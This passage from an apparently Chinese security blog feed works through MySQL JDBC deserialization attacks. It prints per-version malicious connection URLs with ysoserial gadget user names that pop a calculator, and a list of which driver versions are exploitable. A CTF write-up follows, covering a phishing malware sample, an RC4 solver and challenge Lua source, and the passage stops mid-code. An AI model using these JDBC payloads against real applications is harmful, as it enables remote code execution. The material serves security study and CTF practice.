(com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryPacket:<span class="number">963</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">sendQueryString:<span class="number">914</span>, NativeProtocol (com.mysql.cj.protocol.a)</span><br><span class="line">execSQL:<span class="number">1150</span>, NativeSession (com.mysql.cj)</span><br><span class="line">setAutoCommit:<span class="number">2064</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">handleAutoCommitDefaults:<span class="number">1382</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">initializePropsFromServer:<span class="number">1327</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connectOneTryOnly:<span class="number">966</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">createNewIO:<span class="number">825</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">&lt;init&gt;:<span class="number">455</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">getInstance:<span class="number">240</span>, ConnectionImpl (com.mysql.cj.jdbc)</span><br><span class="line">connect:<span class="number">207</span>, NonRegisteringDriver (com.mysql.cj.jdbc)</span><br><span class="line">getConnection:<span class="number">664</span>, DriverManager (java.sql)</span><br><span class="line">getConnection:<span class="number">270</span>, DriverManager (java.sql)</span><br><span class="line">main:<span class="number">10</span>, Jdbc8 (com.ocean)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„jdbcç‰ˆæœ¬æ˜¯8,ä½ç‰ˆæœ¬å¤§è‡´æµç¨‹ä¹Ÿæ˜¯è¿™æ ·ï¼Œåªæœ‰å°‘æ•°å¼‚åŒç‚¹ï¼Œä½†æœ€åéƒ½æ˜¯è¿›å…¥getObjectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–</p><h3 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mysql.jdbc.PreparedStatement;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc5</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;  </span><br><span class="line">        <span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> (PreparedStatement) connection.prepareStatement(sql);  </span><br><span class="line"><span class="comment">//æ‰§è¡ŒæŸ¥è¯¢æ“ä½œï¼Œè¿”å›çš„æ˜¯æ•°æ®åº“ç»“æœé›†çš„æ•°æ®è¡¨  </span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108141740455.png" class=""><h3 id="5-1-11-5-x-xx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc5_1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108141922902.png" class=""><h3 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;  </span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Jdbc6</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:59716/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=deser_CC31_open -a Calculator&quot;</span>;  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108142247010.png" class=""><h2 id="detectCustomCollationsé“¾"><a href="#detectCustomCollationsé“¾" class="headerlink" title="detectCustomCollationsé“¾"></a>detectCustomCollationsé“¾</h2><p>è¿™é‡Œçš„ä¸åŒç‚¹åœ¨ä¸èµ°çš„æ˜¯ <code>com.mysql.cj.jdbc.ConnectionImpl</code>ç±»çš„<code>buildCollationMapping</code>æ–¹æ³•ä¹‹åéƒ½æ˜¯ä¸€ä¸ªæµç¨‹å‰é¢ä¹Ÿæ˜¯ä¸€æ ·çš„</p><img src="/2025/01/07/Java%E5%AE%89%E5%85%A8/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/IMAGE20250108142926685.png" class=""><p>åˆ—ä¸€ä¸‹å¯ä»¥ç”¨çš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) MYSQL5<span class="number">.1</span><span class="number">.41</span>åŠä»¥ä¸Š: ä¸å¯ç”¨</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) MYSQL5<span class="number">.1</span><span class="number">.29</span>-<span class="number">5.1</span><span class="number">.40</span>:</span><br><span class="line"></span><br><span class="line">jdbc:mysql:<span class="comment">//127.0.0.1:3306/test?detectCustomCollations=true&amp;amp;autoDeserialize=true&amp;amp;user=yso_JRE8u20_calc</span></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>) MYSQL5<span class="number">.1</span><span class="number">.28</span>-<span class="number">5.1</span><span class="number">.19</span>:</span><br><span class="line"></span><br><span class="line">jdbc:mysql:<span class="comment">//127.0.0.1:3306/test?autoDeserialize=true&amp;amp;user=yso_JRE8u20_calc</span></span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>) MYSQL5<span class="number">.1</span><span class="number">.18</span>ä»¥ä¸‹çš„<span class="number">5.1</span>.xç‰ˆæœ¬: ä¸å¯ç”¨</span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>) MYSQL5<span class="number">.0</span>.xç‰ˆæœ¬: ä¸å¯ç”¨</span><br></pre></td></tr></table></figure><p>å‰©ä¸‹çš„å°±æ˜¯ä¾ç„¶å¯ä»¥åˆ©ç”¨å·¥å…·è¿›è¡Œå¤ç°å°±ä¸åœ¨å¤ç°äº†ã€‚</p><h3 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29-5.1.40"></a>5.1.29-5.1.40</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;  </span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Connection conn=<span class="literal">null</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3309/mysql?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections7_calc&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections7_calc&quot;</span>;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;  </span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);  </span><br><span class="line">        conn = DriverManager.getConnection(url, username, password);</span><br></pre></td></tr></table></figure><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://forum.butian.net/share/2872">https://forum.butian.net/share/2872</a><br><a href="https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://boogipop.com/2023/03/11/WebDog%E5%BF%85%E5%AD%A6%E7%9A%84JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> JDBC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶ç³»ç»Ÿå®‰å…¨æ”»é˜²èµ›Wp</title>
      <link href="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/"/>
      <url>/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/</url>
      
        <content type="html"><![CDATA[<h2 id="é’“é±¼é‚®ä»¶"><a href="#é’“é±¼é‚®ä»¶" class="headerlink" title="é’“é±¼é‚®ä»¶"></a>é’“é±¼é‚®ä»¶</h2><p>è¿™é¢˜æ˜¯ç­¾åˆ°é¢˜ï¼Œç»™äº†ä¸€ä¸ªé‚®ä»¶ï¼Œæˆ‘æ˜¯ç”¨çš„é£ä¹¦æ‰“å¼€çš„</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106121545994.png" class=""><p>è¿™é‡Œé¢æœ‰ä¸€ä¸ªé™„ä»¶æ‰“å¼€éœ€è¦å¯†ç å¯ä»¥çœ‹åˆ°æç¤ºå’Œé‚®ä»¶æ—¥æœŸæ—¶é—´æ¨æµ‹ä¸ºç”Ÿæ—¥å¯†ç ã€‚æ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ªæœ¨é©¬æ ·æœ¬ä¸¢åˆ°å¾®æ­¥æ²¡åˆ†æå‡ºæ¥å¤–è”ipå’Œç«¯å£äºæ˜¯å°±æ”¾è‡ªå·±æœ¬åœ°è™šæ‹Ÿæœºè·‘äº†ä¸‹çœ‹ç½‘ç»œé€šä¿¡ï¼Œèƒ½æ‰¾åˆ°ipç›´æ¥md5åŠ å¯†æäº¤å³å¯</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106121727731.png" class=""><h2 id="donntyousee"><a href="#donntyousee" class="headerlink" title="donntyousee"></a>donntyousee</h2><p>é¦–å…ˆå»é™¤èŠ±æä»¤ï¼Œæ˜¯æŠŠä¸€ä¸ªå‡½æ•°æ‹†åˆ†æˆäº†ä¸¤æ®µï¼ŒæŠŠå›¾ä¸­ä¸€æ®µnopæ‰å†U+Pï¼Œéœ€è¦å¯¹ä¿©ä¸ªå‡½æ•°å»èŠ±ï¼Œç¬¬ä¸€ä¸ªæ˜¯startä¸­405559ï¼Œçš„ç¬¬äºŒä¸ªå‡½æ•°æ˜¯åŠ¨è°ƒæŸ¥çœ‹çš„405eaaã€‚</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106121816891.png" class=""><p>å‘ç°æ˜¯rc4ç®—æ³•ï¼Œå˜å¼‚äº†ä¸€æ­¥å¼‚æˆ–0x23,å¯†æ–‡éœ€è¦åŠ¨è°ƒæŸ¥çœ‹ï¼Œå¯†æ–‡å¦‚ä¸‹ï¼š</p><img src="/2025/01/06/CTF/WP/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9BWp/IMAGE20250106121831656.png" class=""><p>æ¯”è¾ƒæ¶å¿ƒçš„æ˜¯å­˜åœ¨åè°ƒè¯•ï¼Œå› æ­¤åŠ¨è°ƒè·å¾—çš„å¯†é’¥æ˜¯é”™è¯¯çš„ï¼Œé™æ€æŸ¥çœ‹çš„å¯†é’¥æ˜¯æ­£ç¡®çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;\x92\x1C+\x1F\xBA\xFB\xA2\xFF\ai&#125;w\x18\x8C&#x27;</span></span><br><span class="line"></span><br><span class="line">ciphertext = <span class="built_in">bytearray</span>([<span class="number">0x25</span>,<span class="number">0xCD</span>, <span class="number">0x54</span>, <span class="number">0xAF</span>, <span class="number">0x51</span>, <span class="number">0x1C</span>, <span class="number">0x58</span>, <span class="number">0xD3</span>, <span class="number">0xA8</span>, <span class="number">0x4B</span>, <span class="number">0x4F</span>, <span class="number">0x56</span>, <span class="number">0xEC</span>, <span class="number">0x83</span>, <span class="number">0x5D</span>, <span class="number">0xD4</span>, <span class="number">0xF6</span>, <span class="number">0x47</span>, <span class="number">0x4A</span>, <span class="number">0x6F</span>, <span class="number">0xE0</span>, <span class="number">0x73</span>, <span class="number">0xB0</span>, <span class="number">0xA5</span>, <span class="number">0xA8</span>, <span class="number">0xC3</span>, <span class="number">0x17</span>, <span class="number">0x81</span>, <span class="number">0x5E</span>, <span class="number">0x2B</span>, <span class="number">0xF4</span>, <span class="number">0xF6</span>, <span class="number">0x71</span>, <span class="number">0xEA</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0xA8</span>, <span class="number">0x63</span>, <span class="number">0x99</span>, <span class="number">0x57</span>]</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">cipher = ARC4.new(key)</span><br><span class="line"></span><br><span class="line">decrypted_data = cipher.decrypt(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> decrypted_data:</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="number">0x23</span>),end = <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="CachedVisitor"><a href="#CachedVisitor" class="headerlink" title="CachedVisitor"></a>CachedVisitor</h2><p>è¿™é¢˜è‡ªå·±æœ‰ç‚¹è ¢äº†å½“æ—¶æ¯”èµ›çš„æ—¶å€™çœ‹ç€èƒ½è¿›å¤èµ›äº†å°±èµ°äº†æ²¡åšï¼Œå› ä¸ºå‰é¢ç¡®å®å°è¯•äº†å¾ˆå¤šæ¬¡å¿˜äº†é™„ä»¶é‡Œç»™äº†readflagå¯¼è‡´ä¸€ç›´æ²¡æ‰“æˆåŠŸèµ›ååƒäº†ä¸ªæµ·åº•æå›æ¥å¤ç°äº†ä¸€ä¸‹åšå‡ºæ¥çš„å¤ªè ¢äº†è‡ªå·±ã€‚</p><p>å…ˆæ¥çœ‹çœ‹æºç </p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">read_file</span><span class="params">(filename)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> file <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error: Could not open file &quot;</span> .. filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> content = file:<span class="built_in">read</span>(<span class="string">&quot;*a&quot;</span>)</span><br><span class="line"></span><br><span class="line">file:<span class="built_in">close</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">execute_lua_code</span><span class="params">(script_content)</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> lua_code = script_content:<span class="built_in">match</span>(<span class="string">&quot;##LUA_START##(.-)##LUA_END##&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> lua_code <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> chunk, err = <span class="built_in">load</span>(lua_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> chunk <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> success, result = <span class="built_in">pcall</span>(chunk)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> success <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error executing Lua code: &quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error loading Lua code: &quot;</span>, err)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Error: No valid Lua code block found.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> filename = <span class="string">&quot;/scripts/visit.script&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> script_content = read_file(filename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> script_content <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">execute_lua_code(script_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>scriptsæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ visit.script</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 